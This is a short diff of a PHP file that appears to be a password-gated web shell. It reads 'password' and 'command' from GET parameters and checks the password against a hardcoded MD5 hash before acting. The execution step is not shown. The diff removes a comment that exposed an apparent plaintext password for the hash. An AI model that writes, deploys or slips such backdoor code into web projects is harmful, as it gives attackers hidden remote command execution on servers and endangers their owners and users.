@@ -28,8 +28,8 @@
     </body>
     </html>';
 
-    $pw = "87c4ab4263e22a36195aeff4ac0b5693"; # ufJH7dn!_@kfu@.U7dnc
-    $req_method = $_GET; # || $_POST
+    $pw = "87c4ab4263e22a36195aeff4ac0b5693"; 
+    $req_method = $_GET; 
 
     if(isset($req_method["password"]) && md5($req_method["password"]) == $pw && isset($req_method["command"])){
         echo "<script>document.body.innerHTML = \"\";</script>";
